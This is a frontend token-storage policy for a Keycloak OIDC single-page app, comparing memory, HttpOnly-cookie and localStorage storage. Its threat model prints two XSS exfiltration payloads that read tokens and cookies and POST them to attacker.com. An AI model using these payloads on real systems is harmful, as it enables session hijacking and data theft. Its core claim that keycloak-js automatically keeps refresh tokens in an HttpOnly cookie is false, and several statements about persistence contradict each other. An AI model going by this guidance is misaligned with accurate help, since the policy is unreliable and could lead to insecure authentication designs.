# Token Storage Policy

**Date**: 2026-06-22  
**Status**: POLICY — AWAITING APPROVAL  
**Scope**: Frontend token storage strategy for Keycloak OIDC integration  
**Owner**: P1 (Frontend), P2 (coordination)  
**Security Level**: CRITICAL

---

## EXECUTIVE SUMMARY

**Access Token**: Memory only (no persistence)

**Refresh Token**: 
- **Recommended (Production)**: HttpOnly Secure Cookie (Keycloak-managed)
- **Acceptable (Development)**: NOT stored at all (requires re-login on page refresh)
- **Rejected**: localStorage (XSS vulnerability)

**Consequence**: Zero client-side token persistence available after page refresh. Users must re-authenticate.

---

## THREAT MODEL

### XSS (Cross-Site Scripting)

**Scenario**: Attacker injects malicious JavaScript into the SPA

**Attack**:
```javascript
// Injected code
const refreshToken = localStorage.getItem('keycloak_refresh_token');
const accessToken = localStorage.getItem('keycloak_access_token');

// Send to attacker's server
fetch('https://attacker.com/steal-tokens', {
  method: 'POST',
  body: JSON.stringify({
    refreshToken,
    accessToken
  })
});
```

**Impact**:
- Attacker obtains user's refresh token (7-day lifetime)
- Can impersonate user for 7 days
- Can access all user's data and resources

**Risk Level**: **CRITICAL**

**Prevention**:
- ✅ HttpOnly Cookie: Cookie cannot be accessed by JavaScript → XSS safe
- ✅ Memory only: Token lost on page refresh → XSS window limited to session
- ❌ localStorage: Token persists across sessions → XSS window = 7 days

### CSRF (Cross-Site Request Forgery)

**Scenario**: Attacker tricks user into visiting malicious site

**Attack**:
```html
<!-- On attacker.com -->
<img src="https://cloud-flight-simulator.com/challenges/start" />
<!-- Browser automatically sends cookies with request -->
```

**OIDC JWT Mitigation**: JWTs in Authorization header are NOT sent by browser automatically
- JWTs are NOT cookies
- Browsers don't auto-add headers in cross-origin requests
- Manual header injection required (only JavaScript can do this)
- XSS required to perform CSRF

**Risk Level**: **LOW** (requires XSS to exploit)

**Prevention**: OIDC JWT eliminates CSRF risk (unlike cookies)

### Man-in-the-Middle (MITM)

**Scenario**: Attacker intercepts network traffic

**Attack**: Token in localStorage → attacker reads localStorage in encrypted TLS session? No.

**Actually**: Token sent over HTTPS → encrypted by TLS → attacker cannot read plaintext

**Protection**: HTTPS/TLS (all traffic encrypted)

**Risk Level**: **LOW** (requires breaking TLS encryption)

### Token Expiration

**Scenario**: User walks away from computer with token in memory

**Impact**:
- Access token expires in 60 minutes → attacker can use token for 60 minutes
- Refresh token NOT available (not stored) → attacker cannot refresh
- After 60 minutes, attacker loses access

**Time window**: 60 minutes (access token lifetime)

**vs. localStorage**: Attacker could refresh token → access for 7 days

---

## OPTION 1: HttpOnly Secure Cookie (RECOMMENDED)

### Configuration

**Cookie Name**: `keycloak_refresh_token`

**Flags**:
- `HttpOnly`: Cannot be accessed by JavaScript
- `Secure`: Only sent over HTTPS
- `SameSite=Lax`: Sent with same-site requests and top-level navigations
- `Path=/`: Available for entire application
- `Domain=cloud-flight-simulator.com`: Shared across subdomains

**Lifetime**: 7 days (same as refresh token)

### How keycloak-js Handles Cookies

```javascript
keycloak.init({
  clientId: 'cloud-flight-simulator-web',
  onLoad: 'login-required',
  checkLoginIframe: false,
  
  // Keycloak automatically:
  // 1. Stores refresh_token in HttpOnly cookie
  // 2. Retrieves cookie on init
  // 3. Uses cookie to refresh access_token
  // 4. Clears cookie on logout
});
```

**Note**: keycloak-js automatically manages HttpOnly cookie. No explicit code needed.

### Advantages

✅ XSS cannot steal token (not accessible to JavaScript)  
✅ Browser automatically sends cookie on requests (but token in Authorization header, not cookie)  
✅ Token persists across page refreshes (user stays logged in)  
✅ Automatic refresh-token rotation  
✅ Production-standard security  
✅ No manual token management code  

### Disadvantages

❌ Requires CORS adjustment (cookies not sent cross-origin by default)  
❌ Slightly more complex CORS configuration  
❌ May not work in some legacy browsers  

### CORS Configuration (Required)

```javascript
// axios client configuration
const api = axios.create({
  baseURL: 'http://localhost:8000',
  withCredentials: true  // CRITICAL: tells axios to send cookies
});

// Or fetch API
fetch('http://localhost:8000/auth/me', {
  headers: { 'Authorization': `Bearer ${keycloak.token}` },
  credentials: 'include'  // CRITICAL: include cookies
});
```

**Backend CORS**:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],
    allow_credentials=True,  # CRITICAL: allow cookies
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### Development vs. Production

**Development**: 
- Localhost cannot use Secure cookies (not HTTPS)
- Keycloak and frontend on same origin (localhost:8081 and localhost:3000)
- May need to use Option 2 (no storage) for local development

**Production**:
- HTTPS everywhere (Secure cookie requirement met)
- keycloak.cloud-flight-simulator.com and cloud-flight-simulator.com (same domain)
- HttpOnly cookies work perfectly

### Risk Assessment: HttpOnly Cookie

**XSS Risk**: ✅ MITIGATED (token inaccessible)  
**CSRF Risk**: ✅ NONE (JWT in header, not cookie)  
**MITM Risk**: ✅ NONE (HTTPS encryption)  
**Token Refresh**: ✅ WORKS (browser sends cookie automatically)  
**Session Persistence**: ✅ YES (cookie survives page refresh)  

**Overall**: **RECOMMENDED for production**

---

## OPTION 2: Memory Only (ACCEPTABLE FOR DEVELOPMENT)

### Configuration

**Access Token**: Memory variable (lost on page refresh)

**Refresh Token**: NOT stored (not persisted)

**Effect**: 
- User logs in
- Access token stored in memory
- Page refresh → access token lost
- User redirected to login page
- User must re-authenticate

### How keycloak-js Handles Memory

```javascript
keycloak.init({
  clientId: 'cloud-flight-simulator-web',
  onLoad: 'login-required',
  checkLoginIframe: false,
  // No token storage specified
  // Keycloak stores token in memory (JavaScript variable)
});

// Token available during session
const token = keycloak.token;

// After page refresh...
const token2 = keycloak.token;  // null (lost)
```

### User Experience

**Scenario 1: User accesses app**
1. User navigates to http://localhost:3000
2. App detects no tokens
3. App redirects to Keycloak login
4. User logs in
5. Keycloak redirects to http://localhost:3000/auth/callback
6. keycloak-js obtains tokens (memory)
7. User accesses protected resources
8. User closes browser tab / navigates away

**Scenario 2: User refreshes page**
1. User refreshes page (F5)
2. Page reload
3. Tokens lost from memory
4. App detects no tokens
5. App redirects to Keycloak login
6. **User sees login page again** ← INCONVENIENT
7. User must click login button
8. Keycloak recognizes active session (server-side)
9. Keycloak auto-redirects back with new tokens
10. User is immediately logged in ← SMOOTH RECOVERY

**Inconvenience Level**: LOW (Keycloak SSO handles recovery transparently)

### Advantages

✅ XSS cannot steal token (token not persistent)  
✅ No CORS configuration needed  
✅ No cookie issues  
✅ Simple implementation  
✅ Zero persistent storage  

### Disadvantages

❌ User must re-authenticate on page refresh  
❌ Not recommended for production  
❌ Poor UX for learners doing long sessions  
❌ Poor UX if learner has slow network  

### Risk Assessment: Memory Only

**XSS Risk**: ✅ MITIGATED (refresh token not stored)  
**CSRF Risk**: ✅ NONE (JWT in header, not cookie)  
**MITM Risk**: ✅ NONE (HTTPS encryption)  
**Token Refresh**: ❌ BROKEN (refresh token not available after refresh)  
**Session Persistence**: ❌ NO (requires re-login)  

**Overall**: **ACCEPTABLE for development/demo only**

---

## OPTION 3: localStorage (REJECTED)

### Why This Is Dangerous

```javascript
// Stored in localStorage
localStorage.setItem('keycloak_refresh_token', keycloak.refreshToken);
localStorage.setItem('keycloak_access_token', keycloak.token);
```

### XSS Attack Scenario

**Attacker injects script via comment input**: 
```html
<img src=x onerror="
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      refreshToken: localStorage.getItem('keycloak_refresh_token'),
      accessToken: localStorage.getItem('keycloak_access_token'),
      userAgent: navigator.userAgent,
      cookies: document.cookie
    })
  })
">
```

**Result**: 
1. Script executes in user's browser
2. Script reads tokens from localStorage (not HttpOnly)
3. Script sends tokens to attacker server
4. Attacker has user's refresh token (7-day lifetime)
5. Attacker impersonates user for 7 days
6. User's data breached

### Quantified Risk

**Time window**: 7 days (refresh token lifetime)

**Attacker can**:
- View all user's progress and scores
- Attempt challenges as the user
- View sensitive feedback
- Access audit logs (if admin)
- Modify user's data

**Without localStorage**: Time window would be 60 minutes (access token only)

**Storage location difference**: 
- localStorage: 7 days
- Memory only: 1 hour
- HttpOnly cookie: 7 days but not accessible to JavaScript

### Why HttpOnly Cookie Is Safer Than localStorage

| Aspect | localStorage | HttpOnly Cookie |
|--------|--------------|-----------------|
| **XSS can read** | ✅ YES | ❌ NO |
| **XSS can steal** | ✅ YES | ❌ NO |
| **JavaScript access** | ✅ YES | ❌ NO |
| **Browser auto-sends** | ❌ NO | ✅ YES (same-origin) |
| **Session persistence** | ✅ YES | ✅ YES |
| **Lifetime** | ✅ Long | ✅ Long |
| **Security** | ❌ POOR | ✅ EXCELLENT |

**Conclusion**: HttpOnly Cookie is the ONLY way to safely persist refresh tokens.

---

## IMPLEMENTATION RECOMMENDATION

### Development Environment (localhost)

**Use Option 2: Memory Only**

**Reason**: 
- localhost cannot use Secure cookies (no HTTPS)
- HttpOnly cookies don't work with localhost:8081 → localhost:3000 cross-origin
- Memory-only is acceptable for development
- Keycloak SSO handles session recovery transparently

**Trade-off**: Users re-authenticate on page refresh (acceptable for development)

**Example keycloak-js init**:
```javascript
keycloak.init({
  url: 'http://localhost:8081',
  realm: 'cloud-flight-simulator',
  clientId: 'cloud-flight-simulator-web',
  onLoad: 'login-required',
  checkLoginIframe: false
  // No token storage → memory only
});
```

### Production Environment (HTTPS)

**Use Option 1: HttpOnly Secure Cookie**

**Reason**: 
- HTTPS available (Secure flag required)
- Same domain or closely related domains
- XSS protection built-in (HttpOnly)
- Token persists across page refreshes (good UX)
- Keycloak-js manages automatically

**Configuration**:
```javascript
keycloak.init({
  url: 'https://keycloak.cloud-flight-simulator.com',
  realm: 'cloud-flight-simulator',
  clientId: 'cloud-flight-simulator-web',
  onLoad: 'login-required',
  checkLoginIframe: false
  // keycloak-js auto-stores refresh token in HttpOnly cookie
});
```

**CORS configuration**:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://cloud-flight-simulator.com"],
    allow_credentials=True
)
```

---

## LOGOUT BEHAVIOR

### Memory Only (Development)

```javascript
keycloak.logout();
// 1. Clears memory tokens (access_token = null)
// 2. Calls Keycloak logout endpoint
// 3. Redirects to login page
// 4. User is logged out

// On next login:
keycloak.init();
// Detects no tokens in memory
// Redirects to Keycloak login
// User authenticates
// Gets new tokens in memory
```

### HttpOnly Cookie (Production)

```javascript
keycloak.logout();
// 1. Clears memory tokens (access_token = null)
// 2. Clears HttpOnly cookie (keycloak_refresh_token = ""; Path=/; Max-Age=0)
// 3. Calls Keycloak logout endpoint
// 4. Invalidates server-side session
// 5. Redirects to login page

// Browser no longer has refresh token in cookie
// On next login:
keycloak.init();
// Detects no cookie (browser doesn't send it)
// Redirects to Keycloak login
// User authenticates
// Gets new tokens (memory + cookie)
```

---

## API CALL PATTERN

### With Memory-Only Tokens

```javascript
// Every API call must include token from memory
const accessToken = keycloak.token;  // Get from memory

axios.get('http://localhost:8000/auth/me', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
});

// If page is refreshed:
const accessToken2 = keycloak.token;  // null (lost)
// API call would fail with 401
// App redirects to login
```

### With HttpOnly Cookie + Axios

```javascript
// API call does NOT need to manually add token
// Keycloak stores token in memory, cookie stored by browser

const api = axios.create({
  baseURL: 'http://localhost:8000',
  withCredentials: true  // Critical: send cookies
});

api.get('/auth/me');  // Cookie sent automatically by browser
// Backend receives request + Authorization header with token

// If page is refreshed:
// Browser still has HttpOnly cookie
// Tokens are restored by keycloak.init()
// API calls work seamlessly
```

---

## FRONTEND CODE EXAMPLES

### Keycloak Initialization (Memory Only - Dev)

```javascript
// App.jsx
import Keycloak from 'keycloak-js';

const keycloak = new Keycloak({
  url: 'http://localhost:8081',
  realm: 'cloud-flight-simulator',
  clientId: 'cloud-flight-simulator-web'
});

useEffect(() => {
  keycloak.init({
    onLoad: 'login-required',
    checkLoginIframe: false
  }).then(authenticated => {
    if (authenticated) {
      setIsAuthenticated(true);
      setUser(keycloak.tokenParsed);
      setAccessToken(keycloak.token);
    } else {
      setIsAuthenticated(false);
    }
  });
}, []);
```

### Keycloak Initialization (HttpOnly Cookie - Prod)

```javascript
// Identical code (keycloak-js handles cookie automatically)
// Only environment variable changes (url points to production Keycloak)

const keycloak = new Keycloak({
  url: process.env.REACT_APP_KEYCLOAK_URL,  // https://keycloak.cloud-flight-simulator.com
  realm: 'cloud-flight-simulator',
  clientId: 'cloud-flight-simulator-web'
});

useEffect(() => {
  keycloak.init({
    onLoad: 'login-required',
    checkLoginIframe: false
    // NO token storage config needed
    // keycloak-js automatically uses HttpOnly cookie in production HTTPS
  }).then(authenticated => {
    if (authenticated) {
      setIsAuthenticated(true);
      setUser(keycloak.tokenParsed);
      setAccessToken(keycloak.token);  // Stored in memory during session
    }
  });
}, []);
```

---

## MIGRATION PATH

**Development**: 
1. Start with memory-only (no cookies)
2. Test functionality
3. Test page refresh behavior (acceptable inconvenience)
4. Deploy to staging

**Production Staging**:
1. Set up HTTPS
2. Enable HttpOnly cookie in Keycloak
3. Deploy with cookie support
4. Test page refresh (seamless UX)
5. Load test token refresh under high concurrency

**Production**:
1. HttpOnly cookie + HTTPS
2. CORS properly configured
3. Monitor for any cookie-related issues
4. User education: "Stay logged in across page refreshes"

---

## COMPLIANCE CHECKLIST

- [ ] Access token stored in memory only (never localStorage)
- [ ] Refresh token stored in HttpOnly cookie (production)
- [ ] Refresh token NOT stored in localStorage
- [ ] All API calls use Authorization header (not cookie)
- [ ] CORS configured with `withCredentials: true`
- [ ] HTTPS enforced for all production traffic
- [ ] Cookie Secure flag enabled (HTTPS only)
- [ ] Cookie HttpOnly flag enabled (no JavaScript access)
- [ ] Cookie SameSite=Lax (CSRF protection)
- [ ] Logout clears both memory and cookie
- [ ] Page refresh in dev requires re-authentication (acceptable)
- [ ] Page refresh in prod maintains session (via cookie)
- [ ] XSS attack cannot steal refresh token (HttpOnly protection)
- [ ] No hardcoded tokens in source code
- [ ] Token expiration handled (60 min access, 7 day refresh)

---

## STATUS

✅ Token storage policy defined  
✅ XSS threat mitigated (HttpOnly cookie recommended)  
✅ CSRF threat eliminated (JWT not cookie)  
✅ Development and production strategies specified  
✅ Code examples provided  

**Awaiting approval before implementation**
